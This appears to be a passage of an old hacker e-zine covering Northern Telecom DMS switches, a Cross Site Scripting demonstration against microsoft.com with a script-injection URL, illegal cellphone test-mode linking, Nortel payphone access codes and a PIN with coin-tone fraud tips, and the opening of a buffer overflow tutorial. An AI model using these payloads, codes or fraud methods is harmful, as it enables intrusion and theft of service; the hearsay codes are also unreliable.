+* THAT WE RECOGNIZE THE RIGHT OF GOVERNMENTS TO FORBID THE PUBLICATION OF
+PROPERLY CATEGORIZED STATE SECRETS, CHILD PORNOGRAPHY, AND MATTERS RELATED TO
+PERSONAL PRIVACY AND PRIVILEDGE, AMONG OTHER ACCEPTED RESTRICTIONS. BUT WE
+OPPOSE THE USE OF STATE POWER TO CONTROL ACCESS TO THE WORKS OF CRITICS,
+INTELLECTUALS, ARTISTS, OR RELIGIOUS FIGURES.
+
+* THAT STATE SPONSORED CENSORSHIP OF THE INTERNET ERODES PEACEFUL AND CIVILIZED
+COEXISTENCE, AFFECTS THE EXERCISE OF DEMOCRACY, AND ENDANGERS THE SOCIOECONOMIC
+DEVELOPMENT OF NATIONS.
+
+* THAT STATE-SPONSORED CENSORSHIP OF THE INTERNET IS A SERIOUS FORM OF ORGANIZED
+AND SYSTEMATIC VIOLENCE AGAINST CITIZENS, IS INTENDED TO GENERATE CONFUSION AND
+XENOPHOPIA, AND IS A REPREHENSIBLE VIOLATION OF TRUST.
+
+* THAT WE WILL STUDY WAYS AND MEANS OF CIRCUMVENTING STATE SPONSORED CENSORSHIP
+OF THE INTERNET AND WILL IMPLEMENT TECHNOLOGIES TO CHALLENGE INFORMATION RIGHTS
+VIOLATIONS.
+
+
+
+=====================[ Digital Multiplexing System ]=====================
+=====================[          by Janus           ]=====================
+
+
+
+This article will attempt to explain the DMS (Digital Multiplexing System).
+Think of this file as more of a compilation of the material I have read, rather
+than something I authored completely from scratch. Special thanks to Control-C
+for most of the information found here.
+
+-DMS
+
+DMS was/is made by Northern Telecom. It was first introduced in 1979. To date,
+DMS has been able to interface with such switches as ESS #1-4, Xbar, TSPS, and
+EAX. The DMS switch itself is physically smaller than a Xbar switch, and usually
+smaller than most AXE switches. This is because the DMS switch is more spread
+out, as opposed to other types of switches which are all located in one switch
+house. The use of remote modules give the CO more space to install a Line
+Concentrating Module (LCM) or Main Distribution Frame (MDF). Many versions of
+DMS exist. DMS versions and systems are as follows:
+
+1) DMS-10 - a C5 switch which can be used with up to 10,800 lines. Designed for
+rural areas and large businesses. Almost always connected with a larger DMS-100
+or -100/200 switch.
+
+2) DMS-100 - a C5 local office able to be used with 1,000 to 100,000 lines. Very
+widely used today to handle residential areas' phone lines. A DMS-100 local
+office can also be adapted to Equal Access End Office (EAEO)
+
+3) DMS-200 - can be used with up to 60,000 trunks. Can also serve a AT (Access
+Tandem) function. The Auxiliary Operator Services System (AOSS) is a part of
+DMS-200 that controls Operater-assisted calls, such as Directory Assistance.
+AOSS is made possible by Traffic Operator Position System (TOPS) and Operator
+Centralization (OC). These 2 functions allow transfer operator services from
+other DMS-200 toll centers.
+
+4) DMS 100/200 - Uses functions such as the toll and local systems mentioned
+above, but also includes the EAEO/AT combination. Can handle either 100,000
+lines or 60,000 trunks.  Used instead of using -100 and -200 seperately.
+
+5) DMS-250 - Not very widely used. Used in association with specialized common
+carriers that need tandem switching.
+
+6) DMS-300 - Designed for international use. The number of DMS-300 switches that
+are used is in the single digits.
+
+7) Remote Switching Center (RSC) - Used instead of DMS-100, it has the ability
+to switch up to 5,760 lines.
+
+8) Remote Line Concentrating Module (RLCM) - Able to switch up to 640 lines. Can
+be used with RSC or DMS-100 with assistance from the Line Concentrator Module
+(LCM).
+
+9) Outside Plant Module (OPM) - Able to switch up to 640 lines. Can also be used
+in association with RSC or DMS-100.
+
+10) Subscriber Carrier Module (SCM or SCM-100) -
+
+-a) Subscriber Carrier Module (Rural (SCM-100R)) - Eliminates the CO Central
+Control Terminal (CCT) by being integrated with a DMS-100 switch.
+
+-b) Subscriber Carrier Module SLC-96 (SCM-100S) - gives a direct link between
+DMS-100 and SLC-96 loop carriers.
+
+-c) Subscriber Carrier Module Urban (SCM-100U) - Used to interact with DMS-1
+Urban (DMS version specialized for use in urban areas.)
+
+11) DMS-Mobile Telephone Exhange (DMS-MTX) - A special type of DMS-100 that is
+used with Cellular switching. It can serve up to 50,000 people in up to 50
+cells.
+
+12) Supernode -a) DMS-Supernode - Revision of the DMS-100 that supports faster
+processing.
+
+-b) DMS-Supernode SE - same as above, except in a reduced physical size, and
+uses the Link Peripheral Processor (LPP).
+
+Important Features of DMS-100:
+
+1) Automatic Route Selection - automatically detects the best trunk for routing
+toll and LD calls.
+
+2) Station Message Detail Recording - an enhanced call logging system,keeps
+track of times, dates, duration, etc.
+
+3) Direct Inward System Access (DISA) - allows maintenance and administration
+from remote terminals.
+
+Operator Features included with DMS-200 and -100/200:
+
+1) Traffic Operator Position System (TOPS) - gives certain functions to handle
+incoming and outgoing calls.
+
+2) Operator Centralization (OC) - Lets an operator interface with the switch
+equipment itself. Allows calls to be routed from a remote DMS switch to a host.
+
+DMS is divided into 4 areas that each handle special operations:
+
+1) Central Control Complex (CCC) - Controls the functions that are used in the
+other 3 areas. The CCC contains 4 units:
+
+-a) Central Processing Unit: Each DMS switch contains 2 CPUs. The CPUs have
+access to memory banks where stored programs and network data are located.
+Consider the CPUs the "engines" of the switch. They process all incoming data
+from outside lines.
+
+-b) Program Store Memory Module: Associated with one CPU to contain the program
+instructions needed to run programs on the switch. The second PS contains
+duplicate instructions.
+
+-c) Data Store Memory Module: Contains information such as customer information
+and office data. The second DS is a duplicate that is used with the second CPU.
+
+-d) Central Message Controller: Controls the messages between the other areas of
+the CCC and the Network Message Controller (NMC) in the various Network Modules
+or the I/O controller. Both CPUs have access to the CMC.
+
+2) Network (NET) - Network Modules handle the vocal aspect between the
+Peripheral Modules and the Central Control Complex (CCC).
+
+3) Peripheral Modules (PM) - Interface between analog trunks, subscriber lines,
+and digital carrier spans (DS-1). Responsible for creating dialtones,
+sending/receiving signalling, and checking the network.
+
+Before 1984, the following types of PMs existed:
+
+-a) Trunk Module - Changes speech into digital format to be sent through the
+line.  The TM also handles MF tones, test circuit announcement trunks, etc.
+
+-b) Digital Carrier Module - gives a digital interface between the DMS switch
+and the DS-1 digital carrier. The DS-1 signal consists of 24 voice channels.
+
+-c) Line Module - gives an interface for a maximum of 640 analog lines and
+condenses the voice and signaling into two, three, or four DS-30, 32-channel
+speech links.
+
+-d) Remote Line Module - same as above, except it controls the DMS switch
+remotely.  Can be used up to 150 miles away.
+
+Since 1984, 10 more types were added:
+
+-a) Digital Trunk Controller - Interfaces up to 20 DS-1 lines, then sends the
+DS-1 lines to the network.
+
+-b) Line Group Controller - Can interface up to 20 DS-30 lines, and can serve
+RSCs, RLCMs, or OPMs.
+
+-c) Line Trunk Controller - has the ability to give interfaces to a maximum of
+20 outside ports from DS-30A speech links or DS-1 links to 16 network side DS-30
+speech links.
+
+-d) Line Concentrating Module - An expanded version of the LTC, it can serve up
+to 640 subscriber lines interfaced with 2-6 DS-30 speech links.
+
+-e) Remote Switching Center - interfaces subscriber lines at a remote location
+to a DMS-100 host. The RSC consists of the Line Concentrator Module, Remote
+Cluster Controller, Remote Trunking, Remote-off-Remote, and Emergency
+Stand-alone.
+
+-f) Remote Line Concentrating Module - an LCM used from a remote location from
+the DMS-100 host. Can handle up to 640 lines, sometimes used as replacement for
+PBXs.
+
+-g) Outside Plant Module - Outside plant remote unit. Handles 640 lines over 6
+DS-1 Links.
+
+-h) Subscriber Carrier Module - Remote interface for remote concentrators.
+
+-i) SCM-100R - Can interface up to five DMS-1R Terminals. Each terminal can
+handle up to 256 lines.
+
+-j) SCM-100U - Can interface up to three DMS-1 Urban RTs. Each RT can interface
+up to 576 POTS or special service lines.
+
+4) Maintenance and Adminstration - DMS provides different ways to maintain and
+administrate the network. M&A is divided into 4 major groups:
+
+-a) Administrative: Provides for the interrogation, collection and modification
+of data.
+
+-b) Internal Maintenance: Includes all DMS hardware (to the MDF) and software.
+
+-c) External Maintenance: Includes circuits on the transmission facility.
+
+-d) Reporting: Include I/O facilities and the alarm system.
+
+Common Channel Interoffice Signalling (CCIS) uses a dedicated line to transmit
+data between offices, trunks, or trunk groups. CCIS-6 uses the International
+Consultative Committee on Telephone and Telegraph (CCITT) No. 6 international
+standard. CCIS-7 added the ability to use CCIS with almost all common DMS
+versions such as DMS-100, -200, -100/200, and -100/200 with TOPS. CCIS-6 uses 2
+types of Serving Offices (SO):
+
+1) CCIS-BS: used for trunk signalling between COs. Transmits data such as
+numbers dialed, number dialed from, and other routing information. CCIS-BS put
+an end to Blue Boxing.
+
+2) CCIS-DS: enables the use of touch-tone menu administration, such as voice
+mail, calling card input, and so forth.
+
+Access Tandems:
+
+1) Equal Access (EA) gives a connection between Local Access and Transport Areas
+(LATA).  It provides such services as ANI, Automatic Message Accounting (AMA)
+for both originating and terminating calls, and operator service signaling.
+
+2) Equal Office End Office (EAEO) gives a connection between interLATA carriers
+and international carriers' POP.
+
+3)Access Tandem with Equal Access End Office gives a connection from a trunk
+tandem to ICs/INCs POP inside a LATA. It uses a two-stage "overlap output
+pulsing" method which makes dialing quicker and easier. The first stage
+identifies the INC dialed and picks a reliable outgoing trunk. A connection is
+established from the INC to the EAEO through the access tandem. The second stage
+processes ANI and makes a connection to the called number through your specific
+DMS switch type.
+
+4) Access Tandem with a Non-Equal End Office uses Feature Group A, B, or C to
+connect to an IC/INC. It uses standard Central Automatic Message Accounting
+(CAMA) to place a call through an AT.
+
+Other services provided with DMS switches used in urban areas:
+
+1) Auxiliary Operator Services System (AOSS) - used primarily for directory
+assistance, and the intercept needs not included with TOPS.
+
+2) Integrated Business Network (IBN) - commercial concept designed for business
+to have a small, private PBX. IBN can be installed into a business to a Centrex
+Control Office or a Centrex Costumer Unit with minor hardware adjustments.
+Features of IBN include the ability to handle 30,000 lines, customer call
+records, centralized attendant maintenance, administration functions, and direct
+inward dialing.
+
+3) Electronic Switched Network (ESN) - designed to meet needs of multi- location
+complexes. Used with SL-1 or -100 Digital Business Communications Systems with
+networking features or a DMS-100 IBN host.
+
+4) Specialized Common Carrier Service (SCCS) - provides conversion of analog and
+digital signals. Must be used with older analog lines, sometimes also used with
+newer digital lines.
+
+DMS-MTX is a DMS switch used for switching radio and cellular signals. DMS
+switches provide 3 basic types of cell switching:
+
+1) Stand-alone switching is used by a MTX which is interfaced with one or more
+C5 EOs with DID trunks. MTX is used with urban areas, MTXC for suburban areas,
+and MTXM for rural areas.
+
+2) Combined switching is the most cost-effective type of MTX and is easy to
+install. It can be incorporated into a DMS-100 switch and used with cellular
+software.
+
+3) Remote switching is accomplished by the Remote Switching Center (RSC)
+alongside a Cell Site Controller (CSC). A Remote or Stand-alone switch hosts the
+remote switch. Remote switching is not used in urban areas.
+
+___________ Suggested Reading:  Understanding DMS; Control-C; 1987 (Most of my
+information came from here!) DMS Family of Digital Switching Systems; Erudite;
+????  DMS-100; Jester Sluggo; ????  DMS-100 Family System; Northern Telecom;
+1978
+
+--Janus hijanus@tupac.com
+
+
+
+=================[Cross Site Scripting the Security Gap]=================
+=================[           by Tamer Sahin            ]=================
+
+
+
+I wonder if Microsoft applies the patches on their systems of their products.
+This question is always on my mind. I personally think that sufficient effort is
+not made on this topic,and with a little amount of investigation about it,i've
+found out that a very simple security threat is still standing at the
+microsoft.com web site.This problem ,of course,does not have a direct harm on
+the server,but may turn out to be annoying if used indirectly.Yes,the name of
+this security gap is ""Cross Site Scripting" .This security gap ,which was
+discovered by Georgi Guninski, looks like it might cause some problems in banks
+and some places where online shopping is done.
+
+Can Be Done About It ? I want to talk a little bit about "Cross Site Scripting".
+This security gap was announced in the preceding months.By means of it ,many
+commands can be run on the user's browsers via the intented sites; with the help
+of some scripts ,some processes such as reading files from their discs, or even
+diverting them to other sites can be held out. These kind of security threats
+are big deal for financial settings or for the institutes which provide shopping
+via net ( In one of the commercials of a bank in Turkey, people sit in a car
+,lock the doors ,and with a spontaneous fantasy ,show their id cards to the ones
+who have come out to do banking processes ,to verify the reliability of the site
+. However ,there is this problem in a large amount of sites,but what surprised
+me was to find out that you can see this security gap in microsoft ,too ,which
+has delivered a patch for this problem.
+
+Practice Any asp operating on the site (could be a search engine or could as
+well be null.htw kind of script ) can be run making an addition to the <script>
+figure. I am going to tell how it is run with a minimum code, now. It is not
+difficult at all to write more specific scripts , a little amount of imagination
+could be much more annoying then it is thought,as a security gap. Yes,as i have
+mentioned before,it is not that big deal to alter the properties of this script
+,that's only a minimum instance. Now the hack theories...
+
+Theory? The problem that arised in microsoft ,is the null.htw file which is
+saved on the server.The majority of us (?) delete .htw .idq etc ending scripts
+,or arrange their permissions so that we permit their usage. It looks like the
+Microsoft didnt feel a necessity such that . Writing an url as below,we can run
+the "Cross Site Scripting" security gap ,with the help of null.htw:
+
+http://www.microsoft.com/null.htw?CiWebHitsFile=/default.asp&CiRestriction=
+"<SCRIPT>alert('Helloo!!');</SCRIPT>"
+
+
+
+The Solution You can find a code below ,which can be used for the "Cross Site
+Scripting" attacks on forms etc.With means of this code ,the transfer of the
+large sized script blocks with the "onsubmit" method will be prevented and
+warning signals will be sent for the figures such as "% < > [ ] { } ; & + - " '
+( )" not executing them .
+
+<PRE class=CodeForeground>function checkForm() {
+document.forms[0].userName.value = _
+RemoveBad(document.forms[0].userName.value); return true; } // Bad Characters
+function RemoveBad(strTemp) { strTemp =
+strTemp.replace(/\&lt;|\&gt;|\"|\'|\%|\;|\(|\)|\&amp;|\+|\-/g, ""); return
+strTemp; } </PRE>
+
+
+
+Offical Patch http://www.microsoft.com/technet/security/bulletin/MS00-060.asp
+
+Tamer Sahin Hacking Officer http://www.tamersahin.net feedback@tamersahin.net
+
+
+
+=============[Shell/PPP Connectivity over Cellular Networks]=============
+=============[                   by engel                  ]=============
+
+
+
+
+This hasn't been fully tested (I've only tested the shell portion). It's up to
+you to try out the PPP connection. In theory, it should work, but it's going to
+be really slow.) And be forewarned, this is illegal. Everything you do based on
+this is your choice, not mine. I am only supplying information, and I am not
+responsible for your actions. If the FCC comes a knocking, don't be bitching to
+me or LoU about your legal engagements. It is your fault if you get caught doing
+any of the below in practice. Not mine.
+
+The idea came to me a few months ago when I was in my friend's car, wishing that
+I could nab a few files off my system when we were on the road. It completely
+dawned on me a few minutes later when I was playing with my Motorola 2800
+bagphone. I had to find a way to make a network connection to my main server
+back at my (old) house. And I figured cellular communication was the way to go.
+
+I went home later that day, and dug around my box full of (mostly) various
+electronics and phone equipment. I found an old US Robotics 28.8 ext. modem,
+RJ-11 -> Motorola TeleTAC adapter (For modems, duh.) and my old acoustic
+coupler. I threw the external modem on my server, then ran some RJ11 to the
+adapter, and connected the adapter to the TeleTAC. Whee.
+
+Now, client side, I popped the coupler onto the 2800, then connected it to my
+amazing 14.4 on the lappy. Now how the fuck did I establish the god damn
+connection? This is going to be a bit lengthy, so let's list it out.
+
+1) I edited my inittab (/etc/inittab) and added a dialup term. (You can find
+it.)
+
+2) Popped both cellphones into testmode. Nothing like FCN-00-**-83786633-STO.
+Then I popped them onto an unused channel. And then (gasp) put them into Rx/Tx
+mode by doing the following.  a) 08# b) 10# c) 05# d) 353#
+
+Oh my. I think we can hear ourselves talk over the channel. Isn't that special?
+
+3) On the external modem, I threw a switch on it that said 'Auto Answer'. Now, I
+realize this isn't on all Externals, and I should recommend that you find one,
+wheter it's at a Goodwill, or a vintage computer store.
+
+4) Started minicom on the laptop. And typed in the magical string, ATD.
+
+Boom. That's all it took. I got an amazing 19.2 connection over the cellular
+link. Now, could you get a higher connection with faster modems? No, dumb ass.
+You can probably get a 28.8 connection, but it will most likely time out.
+
+Now, unless you have some really old towers around your area that actually
+forward channels through different towers (i.e. You're driving down the road,
+and you're out of the original tower's range, then you switch over.) you're
+going to get disconnected if you pass the limited range of your tower, which is
+anywhere between 6 to 10 miles. There is only a couple ways around that, but I'm
+sure you can figure them out within a few hours, minutes, or seconds from now.
+
+Okay, so you have yourself a cellular shell. Whoop dee doo. Now if you can
+actually make a networked connection over the link, that would be nice, eh?
+Well, using the wonderful PPP protocol, we can!
+
+Add a new user on your host, name it whatever the fuck you want. Now, for the
+shell, make sure it's /usr/sbin/pppd. Make a new file in your favorite editor
+called .ppprc and put it in the user's $home. Put the following in it.
+
+
+connect -detach modem crtscts lock :192.168.100.4
+
+Whoop, there it is. Now on the client side, make a ppp script that logs in as
+that user. And that's all she wrote. It should work, but I make no guarantees
+whatsoever, since I never tested it.
+
+So play around with it, if you dare. Mail me some followups, additions, and so
+on also, I'd like to hear some new ideas to add to this simple project. Next
+time, I'll get in depth with more wireless networking projects for your geeky
+enjoyment.
+
+http://www.phonegeek.org
+
+ 
+
+=====================[ Nortel Millennium Payphones ]=====================
+=====================[          by ^CircuiT^       ]=====================
+
+
+
+
+Well for you people out there that don't know what a millennium pay phone looks
+like, I'll start out by telling you. There are many different types of
+millennium payphones and none of them look the same, so instead of siting here
+and trying to describe them all I have a few pictures with this file. The most
+common Millennium payphone is the M1231 and since it is the most common that is
+the one I will talk about most in this file. For the rest of them look at the
+end of this file. The M1231 is black with a silver front and a two line LED
+screen that can be reprogrammed to say other things, such as "Mr. T was here"
+but ill be getting into the reprogramming of that a bit later. Under the LED
+screen there are four buttons the first two control the volume. The next one
+controls the languages, for example English to Spanish or English to French. For
+you people in Canada and the last button hangs up your in order to make another
+call. At the top of the phone it's blue and at the bottom there is a yellow card
+reader for smart cards, credit cards, and other calling cards such as MCI
+calling cards. Just above the yellow card reader there are five more buttons
+that the owner/local phone company can program to do what ever they want. There
+are two different versions of the M1231 ver1.0 does not have a RJ-11 jack but
+the ver2.0 does. The RJ-11 jack is there so you can plug your laptop into the
+phone and connect to the Internet. (The M1231 ver2.0 is mostly in airports)
+
+Well know that you know what they look like let's get into the security of the
+pay phone. It has four keyholes as you might have seen by just looking at it.
+The two keyholes on the top and left-hand side of the phone are for changing the
+LED screen. There is another keyhole under neather the yellow card reader that
+is for changing the coin box and on the side of the coin box there is yet
+another keyhole, you need both keys to open the coin box. You will also need an
+access code (or pin) to get to the coin box (this is not yet confirmed). Another
+little bit of security the phone has is an alarm some are silent and some are a
+loud beep. When the alarm is set off the phone calls a set number and notifies
+them that there is a problem. There are some security rumors flying around, such
+as there is a tracking device in the phone and that if a phone stolen and then
+hook-up to a new phone line it will automatically call a set number.
+
+Ok, now that you know about the phones security and how to open it, lets get
+into the internal hardware workings of the phone. Unlike other payphones the
+Nortel Millennium payphone has a built in computer and modem the computer is
+called the "Millennium Manager" and it keeps a log of every call made form the
+phone including (800, 888, 877, 911, 611, 411, 311, and 0). It also keep track
+of how the person paid for the call ( collect, card, cash), and also keeps tabs
+on how many coins are in the coin box and if anything else goes wrong in the
+phone such as the card reader or LED screen it calls a set number and tells
+them, and a log of every time the phone is opened or the coin box is opened or
+if someone changes the display screen. A tool called the "Millennium Maximizer"
+accesses all this but not much is yet known about this. So as I get that
+information I will release it. On to the yellow card reader. Once you have
+opened the phone you should be able to remove the yellow card reader with
+stander tools such as a screwdriver...etc. Once you have the yellow card reader
+you should be able to hook it up to your home computer and read cards with it
+but with what software I don't know. Some people say that you can modify cards
+with it as well but I have seen nothing that would indicate that. Ok now that
+all that stuff is out of the way lets talk about that little two line LED sign.
+To change the display this is what you must do first: You will need two keys one
+for the top and the one for the left-hand side. After unlocking them you will
+have to enter an access code (or pin) from the keypad. (If you don't enter the
+pin an alarm will sound.) Then you can remove the top part of the phone in side
+you will find a port that you can plug in a Millennium Maxmizer.
+
+Ok people, we've made this far so let get straight into the software aspect of
+the phone starting off with the Millennium Manager. The Millennium Manager is
+the program the phone's computer runs, it keep track of everything as I said
+above and that's all I know at this point about the manager. Now onto the
+Opcodes. Opcodes are short strings of number that are pre-set functions on
+Millennium payphones but you must correctly enter a pin before you have the
+chance to input an Opcode. I have heard from other people that you can dial
+2541965 or yet another code that is CRASERV or in numbers 2727378 with the hook
+down. After you dialed it you should be asked for an access code (or pin). One
+known pin is 25563. After you entered the PIN you could enter any Opcode. Here
+are a list of opcodes:  267# Answer detect 274# Display brightness control
+(down?) 277# Display brightness control (up?) 349# Unknown 636# memory access
+688# Unknown 66666# motor sound prompts to open phone - probably coin removal
+996# error has occurred. (Please note these codes are what people have told me I
+have not getten them to work.) Some other software aspects of the phone is the
+fake dial tone, its only a recording. You would know this if you ever picked one
+up cause you hear the fake dial tone and some op telling you to "insert your
+card". So what happens is you dial the number your calling put your money in and
+the computer dials it so you never get the chance to hear a real dial tone. You
+might be asking yourself if I don't ever hear a real dial tone can I box a call
+off a millennium phone. The answer is yes and no. Yes you can box local calls, I
+do it all the time just hit 0 for the op and tell her the phone's keypad is
+messed up and ask her to dial for you then drop in your tones. The No is for
+boxing long distances calls, the Op's don't really like it when you put in $3.50
+in fake coins.
+
+One of the most fun things I have found about the millennium phone is that you
+can use it as a DTMF decoder. It's really simple to all you do is take you
+recorded DTMF tone to the phone and play them really loud into the month piece
+of the phone the numbers will show up on the LCD screen and there you go, you
+got a DTMF decoder.
+
+Well we have covered a hole lot about the millennium payphone but theres still a
+little bit to cover like the fact that millennium phones have a ringer but never
+ring. The reason for this is because if you call a millennium phone you will one
+of about four different msg saying things like " this line is for out going
+calls only " or " the number *** - **** is out of serves ". The reason Nortel
+did this was because they didn't want drug dealers hanging out by the phone
+waiting for a call. If you act like a really nice person you can call the op and
+ask her to call you back on it "but wait a min you said they cant get incoming
+calls". Well they can but only from an op see when you call her this pop's up on
+her screen 0 (+) MIL_UNIV or 0 (+) MIL_CARD plus your location so she thinks why
+call them back? But if you convince her who knows you might of made that phone
+ring for the first time ever.
+
+Ok now that we are done with everything lets talk about all the other millennium
+phones. Well since I haven't used any of these phone yet, so I don't have much
+to talk about so I put in here what Nortell has to say about there phone from
+there web page and if your reading this out of the zip you got pictures with
+this file. Enjoy.
+
+The M1000 Public communications access terminals need to be ready for the future
+-- even if they accept only coins today. The Millennium M1000 Coin Basic
+Terminal is an ideal solution for low-revenue sites because it keeps the door
+open to future expansion by allowing you to add options quickly and easily in
+the field. For example, you can install a 2-line x 20-character illuminated
+display that can help you generate new sources of revenue. And to further
+increase payphone usage, you can add the optional card reader. Driven by
+Millennium Manager, this payphone workhorse protects your investment and revenue
+stream with electronic coin validation, anti-fraud capabilities and
+anti-vandalism features.
+
+The M1131 This terminal is the perfect solution for service providers who want
+to offer advanced public communications access while eliminating the cost of
+handling coins. The Millennium M1131 Card Only Terminal handles card
+transactions with ease allowing customers to use a variety of cards, including
+calling cards, credit cards, cash cards and smart cards. Card customization
+programs provide another opportunity to further differentiate yourself from the
+competition by making branding and image advertising possible. And like all
+Millennium terminals, the Card-Only Terminal offers intelligent features such as
+call statistics, self-diagnostics and alarms, store-and-forward routing, voice
+prompts and call rating. Simple to install and maintain, these terminals are
+backed by the powerful, fault-tolerant Millennium Manager.
+
+The M1231 The More payment options mean more customers. From coins to calling
+cards, credit cards, cash cards and smart cards -- the Millennium M1231 MultiPay
+Terminal accepts them all. And with so many options, gaining and retaining
+customer loyalty is as simple as picking up the phone. Millennium MultiPay
+Terminals are changing the scope of customer expectations and the future of
+public payphones. The RJ-11 data jack provides Internet access and enables data
+calls. A scrolling display can double as a billboard for advertising and
+cross-selling promotions. Quick Access Keys speed revenue generation and allow
+customers to access their choices quickly. Busy lobbies, cafeterias, convenience
+stores and parking lots are just a few of the many sites where MultiPay
+Terminals easily reach their earning potential.
+
+The M1241 This advanced terminal can offer consumers more choices, added
+convenience and access to the power of the network. It's the ideal platform,
+allowing smart cards, credit cards and calling cards to drive increased usage
+and revenue. Configured with the RJ-11 integrated data jack, the Millennium
+M1241 MultiPay/MultiApplication Terminal lets you offer easy access to network
+services, e-mail and the Internet to attract callers with laptop computers. Not
+only can you reap additional revenues from the computer calls themselves, the
+terminal's flashing display and Quick Access Keys let you cross-sell your
+products and services to callers during data transactions. Or you can lease
+displays and Quick Access Keys to third-party advertisers for additional
+revenue. The M1241 Terminal also features downloadable code, which allows you to
+make changes and upgrade services without a site visit.
+
+The M1245 This consumer-friendly terminal can provide information to your
+customers with a touch of a button -- while increasing your revenue. With its
+large graphical display, this terminal becomes much more than a payphone to
+attract people on the move. It's an electronic billboard. Ideal for any
+high-traffic site or any retail delivery location, the M1245 MultiApplication
+Terminal is loaded with features -- but uncluttered and easy to use. And it
+accepts coins as well as cards for added convenience and customer appeal. An
+8-line x 20-character easy-to-read display catches the attention of passersby,
+providing a strong promotional and advertising medium. Soft keys support
+interactive phone-based transactions. And graphical images that change whenever
+the receiver goes on-hook or off-hook entice the customer to interact -- all at
+the touch of a button.
+
+The M1361 Millennium Offers an attractive alternative for nontraditional
+payphone locations, such as a waiting room table, lobby counter or the wall in a
+VIP lounge. With its distinctive style and small footprint, the Millennium Desk
+Set delivers all the features, convenience, reliability and security you find in
+Millennium wall-mounted terminals. And it becomes a mobile office -- or home
+away from home - by providing an advanced card reader along with an RJ-11 data
+jack so callers can plug in a laptop computer. An illuminated display and Quick
+Access Keys tell the customer this is more than just a phone. Caller-controlled
+features such as language selection, volume control and a Next Call button make
+using this terminal a comfortable, hassle-free experience.
+
+The M1400 and M1410 Millennium offers correctional facilities what they need
+most -- flexibility and control of inmate communications. Powerful phone
+monitoring and reporting capabilities provide on-line access to management
+information. That means you can adjust payphone functions - such as curfew
+periods, call duration, and changes to call screening lists or personal
+identification numbers (PINs). And you can make these changes without having to
+call your service provider. The Millennium Inmate System also tackles phone
+fraud and illegal activities head-on with capabilities that provide
+unprecedented control over payphone access and usage. And self-diagnostics built
+into each Millennium Inmate Terminal virtually eliminate out-of-service
+situations.
+
+The Millennium Kiosk Represents a new way for you to reach your customers at all
+times, allowing you to deliver email accessibility, web browsing, online
+services, the printing of items such as tickets or vouchers and more. The
+Kiosk's advanced design offers robust and ergonomic terminals designed for
+public use, with open application delivery platforms that feature
+non-proprietary, standards-based architecture. Plus, they are easy to maintain
+with network-based administration that allows the centralized management and
+updates of terminals. You can use the Kiosk to take advantage of your Internet
+and Call Center applications knowing that customers can use this public
+communications device to access your organization. That can mean more revenue
+for you because your business never closes and can operate 24 hours a day, 7
+days a week!
+
+Here is some information and phone number about Nortel that I think some people
+out there might like. There full Corporate name is Nortel Networks Corporation.
+They have Stock Exchanges on New York, Toronto and London stock exchanges. The
+1998 Revenues were US $17.6 billion and the 1998 Earnings were US $1.07 billion.
+They Employ Approximately 70,000 people worldwide. The CEO is John Roth
+(President and Chief Executive Officer). The CFO is Frank A. Dunn (Senior Vice
+President and Chief Financial Officer). The CIO is Keith Powell (Chief
+Information Officer). The CMO is John A. (Ian) Craig (Executive Vice President
+and Chief Marketing Officer). The CTO is Bill Hawe (Senior Vice President and
+Chief Technology Officer). The Corporate Headquarters is at 8200 Dixie Road,
+Suite 100 Brampton, Ontario L6T 5P6 Canada 905-863-0000
+
+1-800-263-7412 Bell Canada Millennium (Help Line) 1-800-567-2448 Bell Canada
+Millennium (Test Line) 1-800-461-1747 Bell Canada Millennium (Voice Test)
+1-800-461-1879 Bell Canada Millennium (Data Test) 1-800-772-2141 Bell Canada
+Millennium (Setshop) 1-800-668-4862 Bell Canada Millennium (Coin) 1-800-466-7835
+Millennium sales representative 1-214-684-5930 Millennium sales representative
+1-416-748-2694 Bell Canada, Pay phone Department Well that's all I hope you
+enjoyed the file and you get some good use out of it. I would like to dedicate
+this file to my loving girlfriend without her support I could not of made this
+happen. I would also like to thank all the people who helped me along the way
+with this file you know who you all are. If anyone wants to contact me E-mail me
+at: circuitpimp@hotmail.com
+
+http://www.ppchq.org
+
+
+
+==================[Writing Buffer Overflow Exploits]=====================
+==================[            by mixter           ]=====================
+
+ 
+
+Buffer overflows in user input dependent buffers have become one of the biggest
+security hazards on the internet and to modern computing in general. This is
+because such an error can easily be made at programming level, and while
+invisible for the user who does not understand or cannot acquire the source
+code, many of those errors are easy to exploit. This paper makes an attempt to
+teach the novice - average C programmer how an overflow condition can be proven
+to be exploitable.
+
+Mixter
+
+1. Memory
+
+Note: The way I describe it here, memory for a process is organized on most
+computers, however it depends on the type of processor architecture. This
+example is for x86 and also roughly applies to sparc.
+
+The principle of exploiting a buffer overflow is to overwrite parts of memory
+which aren't supposed to be overwritten by arbitrary input and making the
+process execute this code. To see how and where an overflow takes place, lets
+take a look at how memory is organized. A page is a part of memory that uses its
+own relative addressing, meaning the kernel allocates initial memory for the
+process, which it can then access without having to know where the memory is
+physically located in RAM. The processes memory consists of three sections:
+
+- code segment, data in this segment are assembler instructions that the
+processor executes. The code execution is non-linear, it can skip code, jump,
+and call functions on certain conditions. Therefore, we have a pointer called
+EIP, or instruction pointer. The address where EIP points to always contains the
+code that will be executed next.
+
+- data segment, space for variables and dynamic buffers
+
+- stack segment, which is used to pass data (arguments) to functions and as a
+space for variables of functions. The bottom (start) of the stack usually
+resides at the very end of the virtual memory of a page, and grows down. The
+assembler command PUSHL will add to the top of the stack, and POPL will remove
+one item from the top of the stack and put it in a register. For accessing the
+stack memory directly, there is the stack pointer ESP that points at the top
+(lowest memory address) of the stack.
+
+2. Functions
+
+A function is a piece of code in the code segment, that is called, performs a
+task, and then returns to the previous thread of execution. Optionally,
+arguments can be passed to a function. In assembler, it usually looks like this
+(very simple example, just to get the idea):
+
+memory address code 0x8054321 <main+x> pushl $0x0 0x8054322 call $0x80543a0
+<function> 0x8054327 ret 0x8054328 leave
+... 
+0x80543a0 <function> popl %eax 0x80543a1 addl $0x1337,%eax 0x80543a4 ret
+
+What happens here? The main function calls function(0); The variable is 0, main
+pushes it onto the stack, and calls the function. The function gets the variable
+from the stack using popl. After finishing, it returns to 0x8054327. Commonly,
+the main function would always push register EBP on the stack, which the
+function stores, and restores after finishing. This is the frame pointer
+concept, that allows the function to use own offsets for addressing, which is
+mostly uninteresting while dealing with exploits, because the function will not
+return to the original execution thread anyways. :-) We just have to know what
+the stack looks like. At the top, we have the internal buffers and variables of
+the function. After this, there is the saved EBP register (32 bit, which is 4
+bytes), and then the return address, which is again 4 bytes. Further down, there
+are the arguments passed to the function, which are uninteresting to us. In this
